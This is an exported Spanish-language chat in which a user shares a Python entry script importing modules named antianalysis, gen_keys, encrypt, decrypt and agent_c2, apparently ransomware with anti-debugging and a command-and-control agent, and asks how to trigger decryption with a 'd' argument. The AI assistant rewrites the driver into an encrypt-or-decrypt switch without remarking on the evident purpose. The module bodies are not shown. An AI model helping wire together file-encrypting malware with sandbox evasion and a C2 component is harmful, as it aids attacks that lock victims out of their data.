# Argumento para descifrado

**Created:** 3/5/2025 15:51  

## Prompt:
si paso un d como argumento al siguiente código debo llamar a una función: import antianalysis
import gen_keys
import encrypt 
import decrypt 
import agent_c2

def main():
    # antianalysis.check_virtualization_and_debbuging() #(estorba al ejecutar me para el código...)
    gen_keys.generate_aes_key()
    gen_keys.generate_rsa_key()
    encrypt.cifrar_archivos()

if __name__ == "__main__":
    main()

## Response:
Parece que quieres modificar el código para que, si pasas un argumento `d` al ejecutarlo, llame a una función específica. Para lograr esto, puedes usar el módulo `sys` para capturar argumentos de línea de comandos y condicionar la ejecución en función de ellos.

Aquí tienes un ejemplo de cómo modificar tu código para que, si se pasa `d` como argumento, se llame a una función específica, como `decrypt.descifrar_archivos()`:

```python
import sys
import antianalysis
import gen_keys
import encrypt
import decrypt
import agent_c2

def main():
    # antianalysis.check_virtualization_and_debbuging() 
    
    if len(sys.argv) > 1 and sys.argv[1] == "d":
        decrypt.descifrar_archivos()
    else:
        gen_keys.generate_aes_key()
        gen_keys.generate_rsa_key()
        encrypt.cifrar_archivos()

if __name__ == "__main__":
    main()
```

### Explicación:

1.  Se importa `sys` para manejar los argumentos de la línea de comandos.
    
2.  Se verifica si hay al menos un argumento y si es `"d"`, en cuyo caso se llama a `decrypt.descifrar_archivos()`.
    
3.  Si no se pasa `"d"`, se ejecuta el flujo normal de generación de claves y cifrado.
    

Ahora, para ejecutar el script y llamar a la función de descifrado, debes correrlo así en la terminal:

```
python script.py d
```

Si lo ejecutas sin argumentos (`python script.py`), seguirá el flujo de cifrado.



---
